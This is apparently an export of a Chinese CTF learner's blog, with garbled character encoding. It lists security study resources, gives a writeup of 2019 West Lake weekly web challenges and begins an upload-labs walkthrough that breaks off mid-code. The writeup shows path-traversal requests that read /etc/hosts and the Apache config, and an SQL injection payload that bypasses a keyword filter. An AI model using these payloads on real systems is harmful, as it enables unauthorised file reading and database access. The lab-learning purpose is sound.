<h2 id="å­¦ä¹ èµ„æº"><a href="#å­¦ä¹ èµ„æº" class="headerlink" title="å­¦ä¹ èµ„æº"></a>å­¦ä¹ èµ„æº</h2><h3 id="æ¨èä¹¦ç±ï¼ˆæˆ‘ä¸ªäººè§‰å¾—ä¸é”™çš„ä¸€äº›ä¹¦ï¼Œæœ‰å¾…è¡¥å……ï¼‰"><a href="#æ¨èä¹¦ç±ï¼ˆæˆ‘ä¸ªäººè§‰å¾—ä¸é”™çš„ä¸€äº›ä¹¦ï¼Œæœ‰å¾…è¡¥å……ï¼‰" class="headerlink" title="æ¨èä¹¦ç±ï¼ˆæˆ‘ä¸ªäººè§‰å¾—ä¸é”™çš„ä¸€äº›ä¹¦ï¼Œæœ‰å¾…è¡¥å……ï¼‰"></a>æ¨èä¹¦ç±ï¼ˆæˆ‘ä¸ªäººè§‰å¾—ä¸é”™çš„ä¸€äº›ä¹¦ï¼Œæœ‰å¾…è¡¥å……ï¼‰</h3><p><a href="https://pan.baidu.com/s/1zdA2dQBXqUG9hkch2uel_g" target="_blank" rel="noopener">Webå®‰å…¨æ·±åº¦å‰–æ</a>  æå–ç ï¼ši3ua<br><a href="https://pan.baidu.com/s/18wYknvl1lA1-lyvXSdNQ5g" target="_blank" rel="noopener">Kaliæ¸—é€æµ‹è¯•æŠ€æœ¯è¯¦è§£</a>  æå–ç ï¼šod9r<br><a href="https://pan.baidu.com/s/1pVjBe6vGSLE5p54Nbi7eZQ" target="_blank" rel="noopener">xssè·¨ç«™è„šæœ¬æ”»å‡»å‰–æ</a> æå–ç ï¼š63o9<br><a href="https://pan.baidu.com/s/16lfw-YFpSTSKsrsKlZU_fA" target="_blank" rel="noopener">SQLæ³¨å…¥æ”»å‡»ä¸é˜²å¾¡</a> æå–ç ï¼šuenu<br><a href="https://pan.baidu.com/s/1u-V477lMYYh3Fa3ODGM3MA" target="_blank" rel="noopener">å¸¸è§å·¥å…·ä½¿ç”¨æ‰‹å†Œ</a> æå–ç ï¼š3om1<br><a href="https://www.cnblogs.com/mengwang024/p/4425834.html" target="_blank" rel="noopener">TCP/IPè¯¦è§£å·1ï¼šåè®®</a><br><a href="https://github.com/riusksk/secbook" target="_blank" rel="noopener">ä¿¡æ¯å®‰å…¨ä»ä¸šè€…ä¹¦å•æ¨è</a></p>
<hr>
<h3 id="æµ‹è¯•ç¯å¢ƒ"><a href="#æµ‹è¯•ç¯å¢ƒ" class="headerlink" title="æµ‹è¯•ç¯å¢ƒ"></a>æµ‹è¯•ç¯å¢ƒ</h3><p><a href="http://phpstudy.php.cn/" target="_blank" rel="noopener">phpstudy</a><br><a href="http://pan.baidu.com/s/1jH4WlMY" target="_blank" rel="noopener">sqli-labs-master</a> æå–ç ï¼š11mj<br><a href="https://github.com/c0ny1/upload-labs" target="_blank" rel="noopener">upload-labs</a><br><a href="https://github.com/binarever/dwva" target="_blank" rel="noopener">dwva</a><br><a href="https://pan.baidu.com/s/1Za1iIuniIeMVw0lGm-6S9w" target="_blank" rel="noopener">æµ‹è¯•å·¥å…·</a> æå–ç ï¼š7num<br>â€¦<br>ä»¥åŠå­¦ä¼šè‡ªå·±æ­ä¸€äº›ç®€å•çš„ç«™ï¼Œå¦‚:ç»‡æ¢¦cmsè¿™ç±»çš„ï¼Œå»çœ‹çœ‹å…¶æºç ï¼Œå»çœ‹çœ‹é‚£äº›åŠŸèƒ½æ€§ä»£ç æ˜¯å¦‚ä½•å®ç°çš„ï¼Œç„¶åå»ç½‘ä¸Šæœä¸€æœä¸€äº›æ¡†æ¶ä¸åŒç‰ˆæœ¬çš„æ¼æ´ï¼Œgitä¸Šä¹Ÿæœ‰å¾ˆå¤šå¤§ä½¬è‡ªå·±å†™çš„ä¸€äº›ç¯å¢ƒï¼Œéƒ½å€¼å¾—å»èŠ±æ—¶é—´å­¦</p>
<hr>
<h3 id="å­¦ä¹ ç½‘ç«™"><a href="#å­¦ä¹ ç½‘ç«™" class="headerlink" title="å­¦ä¹ ç½‘ç«™"></a>å­¦ä¹ ç½‘ç«™</h3><p><a href="https://www.ichunqiu.com/" target="_blank" rel="noopener">iæ˜¥ç§‹</a> å›½å†…å¤–çš„èµ›é¢˜ï¼ˆwpéƒ¨åˆ†è‡ªå¸¦ï¼‰<br><a href="http://www.shiyanbar.com/" target="_blank" rel="noopener">å®éªŒå§</a> ååŸºç¡€ï¼Œä½†æ˜¯å¹³å°æœåŠ¡å™¨æœ‰æ—¶å€™æœ‰é—®é¢˜<br><a href="https://www.kanxue.com/chm.htm" target="_blank" rel="noopener">çœ‹é›ªctf</a> èµ›é¢˜<br><a href="https://www.xctf.org.cn/" target="_blank" rel="noopener">XCTF ç¤¾åŒº</a> éƒ½æ˜¯èµ›é¢˜ï¼Œæ”»é˜²ä¸–ç•Œçš„é¢˜ç›®ï¼ˆéƒ½æœ‰wpï¼‰<br><a href="https://www.linkedbyx.com" target="_blank" rel="noopener">å®‰æ’xè®¡åˆ’å¹³å°</a>  å®‰æ’èµ›é¢˜ï¼ˆwpè¦è‡ªå·±æ‰¾ï¼‰<br><a href="http://ctf.nuptzj.cn/" target="_blank" rel="noopener">å—é‚®ctf</a>  ååŸºç¡€ï¼Œé€‚åˆåˆå­¦(wpç™¾åº¦éƒ½æœ‰)<br><a href="http://sec.hdu.edu.cn/" target="_blank" rel="noopener">æ­ç”µctf</a> é‡ç‚¹æ˜¯Hgame-week-ctf<br><a href="http://hackinglab.cn/" target="_blank" rel="noopener">å›½å®¶ä¿¡æ¯å®‰å…¨æ”»é˜²å­¦ä¹ å¹³å°</a><br><a href="https://ctf.bugku.com/" target="_blank" rel="noopener">BugkuCTF</a> é€‚åˆï¼ˆwpéƒ¨åˆ†å¯ä»¥ç™¾åº¦ï¼‰<br><a href="http://www.wechall.net/" target="_blank" rel="noopener">WeChall</a><br><a href="https://buuoj.cn/" target="_blank" rel="noopener">BuuCTF</a> <strong>åŠ›æ¨èµµå¸ˆå‚…çš„èµ›é¢˜ç½‘ç«™</strong><br><a href="http://www.hetianlab.com/" target="_blank" rel="noopener">åˆå¤©ç½‘å®‰å®éªŒå®¤</a> æ²¡è¯•è¿‡<br><a href="http://wargame.kr/challenge" target="_blank" rel="noopener">Wargame.kr</a> éŸ©å›½çš„ctfé¢˜ï¼Œæœ‰äº›ä¸œè¥¿ï¼Œä½†æ˜¯wpæ¯”è¾ƒå°‘<br><a href="https://leetcode-cn.com/" target="_blank" rel="noopener">leet-code</a> è¿™æ˜¯ç®—æ³•ç±»çš„å­¦ä¹ ç½‘ç«™<br><a href="https://www.csdn.net/" target="_blank" rel="noopener">CSDN</a><br><a href="https://www.cnblogs.com/" target="_blank" rel="noopener">åšå®¢å›­</a><br><a href="https://www.52pojie.cn/" target="_blank" rel="noopener">å¾çˆ±ç ´è§£</a><br><a href="http://www.itdaan.com/index.html" target="_blank" rel="noopener">å¼€å‘è€…çŸ¥è¯†åº“</a></p>
<hr>
<h3 id="å­¦ä¹ å·¥å…·"><a href="#å­¦ä¹ å·¥å…·" class="headerlink" title="å­¦ä¹ å·¥å…·"></a>å­¦ä¹ å·¥å…·</h3><p><a href="https://tools.pediy.com/" target="_blank" rel="noopener">çœ‹é›ªå·¥å…·</a><br><a href="https://down.52pojie.cn/Tools/" target="_blank" rel="noopener">52ç ´è§£</a><br><a href="http://ctf.ssleye.com/" target="_blank" rel="noopener">CTF åœ¨çº¿å·¥å…· by CTFcode</a><br><a href="http://tool.bugku.com/" target="_blank" rel="noopener">CTF åœ¨çº¿å·¥å…·ç®± by bugku</a><br><a href="https://ctftools.com/down/" target="_blank" rel="noopener">CTF å·¥å…·èµ„æºåº“ by HBCTF team</a><br><a href="https://msdn.itellyou.cn/" target="_blank" rel="noopener">è™šæ‹Ÿæœºç¯å¢ƒ</a><br><a href="https://www.baidu.com/" target="_blank" rel="noopener">ä¸­å›½æœ€å¼ºæœç´¢å¼•æ“</a></p>
<hr>
<h3 id="å¤šçœ‹çœ‹å¤§ä½¬çš„blog"><a href="#å¤šçœ‹çœ‹å¤§ä½¬çš„blog" class="headerlink" title="å¤šçœ‹çœ‹å¤§ä½¬çš„blog"></a>å¤šçœ‹çœ‹å¤§ä½¬çš„blog</h3><p>å¾®ç¬‘å¸ˆå‚…ï¼š<a href="https://www.smi1e.top/" target="_blank" rel="noopener">https://www.smi1e.top/</a><br>éƒç¦»æ­Œå¸ˆå‚…ï¼š<a href="http://120.79.189.7/" target="_blank" rel="noopener">http://120.79.189.7/</a><br>Pç¥ï¼š<a href="https://www.leavesongs.com/" target="_blank" rel="noopener">https://www.leavesongs.com/</a><br>ä¸€å¶é£˜é›¶å¸ˆå‚…ï¼š<a href="https://skysec.top/" target="_blank" rel="noopener">https://skysec.top/</a><br>å¤œè«ç¦»å¸ˆå‚…ï¼š<a href="https://yml-sec.top/" target="_blank" rel="noopener">https://yml-sec.top/</a><br><a href="https://github.com/ctfs" target="_blank" rel="noopener">wpåˆé›†</a><br><a href="https://github.com/p4-team/ctf" target="_blank" rel="noopener">P4-team wpåˆé›†</a></p>
<hr>
<h3 id="ä¸šå†…æ–°é—»"><a href="#ä¸šå†…æ–°é—»" class="headerlink" title="ä¸šå†…æ–°é—»"></a>ä¸šå†…æ–°é—»</h3><p><a href="https://www.anquanke.com" target="_blank" rel="noopener">å®‰å…¨å®¢</a><br><a href="https://xz.aliyun.com/" target="_blank" rel="noopener">å…ˆçŸ¥ç¤¾åŒº</a><br><a href="https://www.t00ls.net/" target="_blank" rel="noopener">T00ls</a><br><a href="http://drops.vidar.club" target="_blank" rel="noopener">Vidar Drops</a><br><a href="https://www.freebuf.com/" target="_blank" rel="noopener">Freebuf</a><br><a href="https://www.freebuf.com/" target="_blank" rel="noopener">91Ri</a></p>
<hr>
<h2 id="ä»åŸºç¡€åˆ°è¿›é˜¶"><a href="#ä»åŸºç¡€åˆ°è¿›é˜¶" class="headerlink" title="ä»åŸºç¡€åˆ°è¿›é˜¶"></a>ä»åŸºç¡€åˆ°è¿›é˜¶</h2><p>å› ä¸ºç¬”è€…ä¹Ÿéä¸“ä¸šå‡ºèº«ï¼Œåªèƒ½è¯´è¯´è‡ªå·±å­¦ä¹ æ–¹æ³•ï¼Œçœ‹ä¹¦ã€åšé¢˜ã€å†™wpï¼Œä»åŸºç¡€çŸ¥è¯†å¼€å§‹ï¼Œä¸€ç‚¹ä¸€ç‚¹ç§¯ç´¯ï¼Œå­¦ä¼šè‡ªå·±æ­å»ºå±äºè‡ªå·±çš„åšå®¢ï¼Œä¸æ±‚åˆ«äººå»çœ‹ï¼Œå°±å½“ä½œè‡ªå·±çš„å­¦ä¹ ç§¯ç´¯æ€»ç»“ï¼›è¦æƒ³æŒ–æ¼æ´ï¼Œå°±è¦å­¦ä¼šè‡ªå·±å†™æ¼æ´ï¼Œåªæœ‰è‡ªå·±ç†è§£æ¼æ´çš„å½¢æˆåŸå› ï¼Œè‡ªå·±ç†è§£ä¸ºä»€ä¹ˆä¼šäº§ç”Ÿè¿™æ ·çš„ç»“æœï¼Œæ‰ä¼šå­¦åˆ°çŸ¥è¯†ã€æŒæ¡æ–¹æ³•ï¼›å¤šå’Œåˆ«äººäº¤æµï¼Œæœ‰ç©ºå»çœ‹çœ‹å¤§ä½¬ä»¬çš„ç ”ç©¶å’Œè°ˆè®ºçš„å†…å®¹ï¼›å°è¯•å»æŒ–æ´ï¼ˆç„¶åäº¤è¡¥å¤©èµšç‚¹é›¶é’±233ï¼‰ï¼Œå»è¯•ç€è¯»ä¸€è¯»ä¸€äº›CMSï¼Œå»çœ‹ä¸€äº›æºç ã€‚</p>
<hr>
<h2 id="å€Ÿç”¨Pç¥çš„ä¸€æ®µè¯"><a href="#å€Ÿç”¨Pç¥çš„ä¸€æ®µè¯" class="headerlink" title="å€Ÿç”¨Pç¥çš„ä¸€æ®µè¯"></a>å€Ÿç”¨Pç¥çš„ä¸€æ®µè¯</h2><h3 id="Programming"><a href="#Programming" class="headerlink" title="Programming"></a><strong>Programming</strong></h3><p>ä¸€ä¸ªä¸ä¼šç¼–ç¨‹çš„hackerä¸æ˜¯å¥½hackerï¼ŒåŠªåŠ›æé«˜ç¼–ç æ°´å¹³ï¼Œæ¥è§¦æœ€å‰æ²¿çš„ä»£ç æ€æƒ³ï¼Œæ„æ¶è‡ªå·±çš„å¹³å°æ¡†æ¶ã€‚</p>
<h3 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a><strong>Vulnerability</strong></h3><p>æ²¡æœ‰æ¼æ´å°±æ²¡æœ‰å®‰å…¨ï¼Œå®‰å…¨å»ºç«‹åœ¨å‘ç°æ¼æ´ä¸è§£å†³æ¼æ´ä¹‹é—´ã€‚ä¸–ä¸Šæ²¡æœ‰å®Œç¾çš„ä»£ç ï¼Œä¹Ÿä¸ä¼šæœ‰é›¶æ¼æ´çš„ç¨‹åºã€‚</p>
<h3 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a><strong>Bypass</strong></h3><p>ä¸æ–­åœ°ç»•è¿‡ï¼Œä¸æ–­åœ°çªç ´é˜²å¾¡æœºåˆ¶ï¼Œè€ƒéªŒçš„æ˜¯ä¸€ä¸ªå®‰å…¨ç ”ç©¶è€…å¯¹äºæ¼æ´åŸç†çš„ç†è§£ï¼Œæ›´æ˜¯çŒ¥ççš„æ€è·¯ã€‚</p>
<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a><strong>Exploit</strong></h3><p>å‘ç°ä¸€ä¸ªæ¼æ´ï¼Œä½ æˆåŠŸäº†70%ï¼›å†™å‡ºåˆ©ç”¨ä»£ç ï¼Œå®Œæˆå‰©ä¸‹çš„30%ã€‚è¡Œç™¾æ­¥è€…åŠä¹åã€‚</p>
<hr>
<h2 id="æœ€å"><a href="#æœ€å" class="headerlink" title="æœ€å"></a>æœ€å</h2><p>æ–°ç¯å¢ƒçš„é¢˜ç›®è¿˜æ²¡åšå®Œï¼Œç­‰å…¨éƒ¨åšå®Œäº†ï¼Œå†æ›´wpå§ï¼Œæœ€è¿‘ä½œä¸šå’Œè¦çœ‹çš„ä¹¦ä»»åŠ¡é‡æœ‰ç‚¹å¤§ï¼Œç­‰æ¸…æ˜æ”¾å‡å†å¥½å¥½æ¥åšé¢˜ç ”ç©¶ï¼Œ å°±è¿™æ ·äº†,ä»¥åæœ‰ä»€ä¹ˆè¦è¡¥å……çš„ï¼Œå†æ…¢æ…¢æ¥è¡¥å……ç®—äº†ï¼ˆé€ƒâ€¦<br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g1on6jm4xzj30c40b2q36.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g1on6jm4xzj30c40b2q36.jpg" class="lazyload" title="test"></a></p>
]]></content>
      <categories>
        <category>å­¦ä¹ ç¬”è®°</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>çæ‰¯</tag>
      </tags>
  </entry>
  <entry>
    <title>2019å¹´å®‰æ’è¥¿æ¹–å‘¨å‘¨ç»ƒ webç¯‡</title>
    <url>/yakko117/2019/04/01/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%91%A8%E5%91%A8%E7%BB%83/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>æ— æ³•å»è¥¿æ¹–åˆ’æ°´çš„æˆ‘ï¼Œåªèƒ½åšåšå‘¨å‘¨ç»ƒæ¥æ°´ä¸€æœŸblog<br>å®‰æ’æœˆèµ›åœ°å€ï¼š<a href="https://www.linkedbyx.com" target="_blank" rel="noopener">https://www.linkedbyx.com</a></p>
<h2 id="web-01-AppScan"><a href="#web-01-AppScan" class="headerlink" title="web-01 AppScan"></a>web-01 AppScan</h2><p>æŸå…¬å¸çš„ç½‘ç«™é­å—åˆ°é»‘å®¢æ”»å‡»ï¼Œå­˜æ”¾åœ¨Apacheé…ç½®æ–‡ä»¶ä¸­çš„é‡è¦ä¿¡æ¯è¢«é»‘å®¢ç›—å–äº†ã€‚å…¬å¸å‘˜å·¥ä¸ºäº†éªŒè¯æˆå› ï¼Œä½¿ç”¨æ˜é‰´Webåº”ç”¨å¼±ç‚¹æ‰«æå™¨æ‰«æç½‘ç«™å¹¶å¯¼å‡ºæ¼æ´æŠ¥å‘Šï¼Œä½ èƒ½é€šè¿‡åˆ†ææ¼æ´æŠ¥å‘Šå¾—å‡ºé»‘å®¢å¯èƒ½æ˜¯é‡‡ç”¨å“ªç§æ¼æ´ç›—å–é‡è¦ä¿¡æ¯çš„ä¹ˆï¼Ÿè¢«ç›—å–çš„é‡è¦ä¿¡æ¯æ˜¯ä»€ä¹ˆï¼Ÿ</p>
<p>æŸ¥çœ‹ <strong>MatriXayWebåº”ç”¨å®‰å…¨è¯„ä¼°æŠ¥å‘Š</strong> å‘ç°å­˜åœ¨æ¼æ´<strong>ç›®å½•éå†</strong><br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQgy1g1n62k2vcwj30pn080t9a.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQgy1g1n62k2vcwj30pn080t9a.jpg" class="lazyload" title="test"></a><br>æµ‹è¯•æ¡ˆä¾‹</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;101.71.29.5:10009&#x2F;index.php?act&#x3D;about&amp;file&#x3D;&#x2F;etc&#x2F;hosts</span><br><span class="line">å›æ˜¾</span><br><span class="line">127.0.0.1 localhost localhost.localdomain localhost4 localhost4.localdomain4 ::1 localhost localhost.localdomain localhost6 localhost6.localdomain6</span><br></pre></td></tr></table></figure></div>
<p>æ ¹æ®é¢˜æ„çŸ¥é“æ¼æ´ä¸ºApacheé…ç½®æ–‡ä»¶<br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQgy1g1n62k1omxj30ef06r74b.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQgy1g1n62k1omxj30ef06r74b.jpg" class="lazyload" title="test"></a></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;101.71.29.5:10009&#x2F;index.php?act&#x3D;about&amp;file&#x3D;&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf</span><br></pre></td></tr></table></figure></div>
<p>å¾—åˆ°flag<br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQgy1g1n62k30rvj30gy056wf3.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQgy1g1n62k30rvj30gy056wf3.jpg" class="lazyload" title="test"></a></p>
<hr>
<h2 id="web-02-Dota"><a href="#web-02-Dota" class="headerlink" title="web-02 Dota"></a>web-02 Dota</h2><p>æ— è®ºä½ å–œæ¬¢æ‰“Dotaè¿˜æ˜¯LOLï¼Œéƒ½è¿›ç½‘ç«™é‡Œå­¦ä¹ ä¸€ä¸‹å§ï¼<br>qvq è¿™ä¸ªé¢˜ç›®æˆ‘çŒœåŸæ¥æ˜¯æ‰“ç®—ç”¨å‘½ä»¤æ‰§è¡Œå’Œæ–‡ä»¶åŒ…å«æ¼æ´ç»•è¿‡è¿‡æ»¤å¾—åˆ°flag<br>ç»“æœç›´æ¥è¢«æˆ‘å¾¡å‰‘æ‰«å‡ºæ¥äº† orz</p>
<hr>
<h2 id="web-03-ç¾ç”·å­"><a href="#web-03-ç¾ç”·å­" class="headerlink" title="web-03 ç¾ç”·å­"></a>web-03 ç¾ç”·å­</h2><p>æˆ‘è¿˜æ˜¯æƒ³å®‰é™çš„åšä¸€ä¸ªç¾ç”·å­ï¼</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQgy1g1n62k2cs4j30g4092gm0.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQgy1g1n62k2cs4j30g4092gm0.jpg" class="lazyload" title="test"></a></p>
<p>æŸ¥çœ‹æºä»£ç ï¼Œ å‘ç°tips </p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!--index.phps--&gt;</span><br></pre></td></tr></table></figure></div>
<p>è¿›å…¥ index.phps,æŸ¥çœ‹æºç </p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'global.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">AttackFilter</span><span class="params">($StrKey,$StrValue,$ArrReq)</span></span>&#123;  </span><br><span class="line">    <span class="keyword">if</span>(is_array($StrValue))</span><br><span class="line">    &#123;</span><br><span class="line">        $StrValue=implode($StrValue);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">"/"</span>.$ArrReq.<span class="string">"/is"</span>,$StrtValue)==<span class="number">1</span>)&#123;   </span><br><span class="line">        <span class="keyword">print</span> <span class="string">"holy shit!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;      </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">$filter = <span class="string">"union|select|from|where|join|sleep|benchmark|,|\(|\)"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $key=&gt;$value)&#123; </span><br><span class="line">    AttackFilter($key,$value,$filter);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_POST[<span class="string">'key1'</span>]) || !<span class="keyword">isset</span>($_POST[<span class="string">'key2'</span>])) &#123;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&lt;&lt;&lt;DBAPP</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;img src='image/img.jpg' /&gt;</span></span><br><span class="line"><span class="string">&lt;!--index.phps--&gt;</span></span><br><span class="line"><span class="string">DBAPP;</span></span><br><span class="line">    <span class="keyword">die</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$query = mysql_query(<span class="string">"SELECT * FROM tb_ctf WHERE key1 = '&#123;$_POST['key1']&#125;'"</span>); </span><br><span class="line"><span class="keyword">if</span>(mysql_num_rows($query) == <span class="number">1</span>) &#123; </span><br><span class="line">    $key = mysql_fetch_array($query);</span><br><span class="line">    <span class="keyword">if</span>($key[<span class="string">'key2'</span>] == $_POST[<span class="string">'key2'</span>]) &#123;</span><br><span class="line">        <span class="keyword">print</span> $flag;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Error!"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Error!"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>å®¡è®¡index.phpsæ–‡ä»¶ï¼Œå¤–éƒ¨å¯ä¼ å…¥key1å’Œkey2å‚æ•°ï¼Œå…¶ä¸­key1å‚æ•°å¸¦å…¥SQLæŸ¥è¯¢ã€‚å½“æŸ¥è¯¢ç»“æœä¸ä¸ºç©ºï¼Œä¸”<code>$_POST[&#39;key2&#39;]</code>çš„å€¼ç­‰äº<code>$key[&#39;key2&#39;]</code>æ—¶ï¼Œæ‰“å°flagã€‚</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQgy1g1n62k548ij30vn0950u4.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQgy1g1n62k548ij30vn0950u4.jpg" class="lazyload" title="test"></a></p>
<p>ä½†æ‰€æœ‰çš„POSTå‚æ•°éƒ½ç»è¿‡ä¸€ä¸ªåä¸º<code>AttackFilter()</code>çš„å‡½æ•°ï¼Œè¯¥å‡½æ•°è¿‡æ»¤äº†<code>unionã€selectã€from</code>ç­‰ä¸€ç³»åˆ—å…³é”®å­—ï¼Œå¯¼è‡´æ— æ³•ç›´æ¥ä½¿ç”¨unionæŸ¥è¯¢ã€‚</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQgy1g1n62k7i3cj30ro0addhf.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQgy1g1n62k7i3cj30ro0addhf.jpg" class="lazyload" title="test"></a></p>
<p>æŸ¥è¯¢ç»“æœ<code>$key[â€˜key2â€™]</code>ä¸ºæœªçŸ¥å€¼ï¼Œä½¿ç”¨MySQLä¸­æ•°æ®ç»Ÿè®¡çš„åº”ç”¨<code>with rollup</code>è¿›è¡Œç»•è¿‡ã€‚å¦‚æ‰§è¡Œ<code>grou key2 with rollup</code>ã€‚å¯¹äº<code>group by</code>çš„åˆ—ï¼Œ<code>with rollup</code>å°†ä¸åšä»»ä½•å¤„ç†ï¼Œä¸”è¿”å›NULLã€‚</p>
<p>å› æ­¤ä½¿ç”¨<code>key1=%27 or %27%27=%27%27 group by key2 with rollup limit 1 offset 1#&amp;key2=</code>å³å¯è·å¾—flagã€‚</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQgy1g1n62k5ghij30pz08774u.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQgy1g1n62k5ghij30pz08774u.jpg" class="lazyload" title="test"></a></p>
]]></content>
      <categories>
        <category>å­¦ä¹ ç¬”è®°</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>Upload-labs 20å…³wp</title>
    <url>/yakko117/2019/03/24/upload_labs20/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>upload-labsæ˜¯ä¸€ä¸ªä½¿ç”¨phpè¯­è¨€ç¼–å†™çš„ï¼Œä¸“é—¨æ”¶é›†æ¸—é€æµ‹è¯•å’ŒCTFä¸­é‡åˆ°çš„å„ç§ä¸Šä¼ æ¼æ´çš„é¶åœºã€‚æ—¨åœ¨å¸®åŠ©å¤§å®¶å¯¹ä¸Šä¼ æ¼æ´æœ‰ä¸€ä¸ªå…¨é¢çš„äº†è§£ã€‚ç›®å‰ä¸€å…±20å…³ï¼Œæ¯ä¸€å…³éƒ½åŒ…å«ç€ä¸åŒä¸Šä¼ æ–¹å¼ã€‚<br>é¡¹ç›®åœ°å€ï¼š<a href="https://github.com/c0ny1/upload-labs" target="_blank" rel="noopener">https://github.com/c0ny1/upload-labs</a></p>
<h2 id="Pass-01-js-audit"><a href="#Pass-01-js-audit" class="headerlink" title="Pass-01 js audit"></a>Pass-01 js audit</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">javascript</div></div><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> file = <span class="built_in">document</span>.getElementsByName(<span class="string">'upload_file'</span>)[<span class="number">0</span>].value;</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">""</span>) &#123;</span><br><span class="line">        alert(<span class="string">"è¯·é€‰æ‹©è¦ä¸Šä¼ çš„æ–‡ä»¶!"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//å®šä¹‰å…è®¸ä¸Šä¼ çš„æ–‡ä»¶ç±»å‹</span></span><br><span class="line">    <span class="keyword">var</span> allow_ext = <span class="string">".jpg|.png|.gif"</span>;</span><br><span class="line">    <span class="comment">//æå–ä¸Šä¼ æ–‡ä»¶çš„ç±»å‹</span></span><br><span class="line">    <span class="keyword">var</span> ext_name = file.substring(file.lastIndexOf(<span 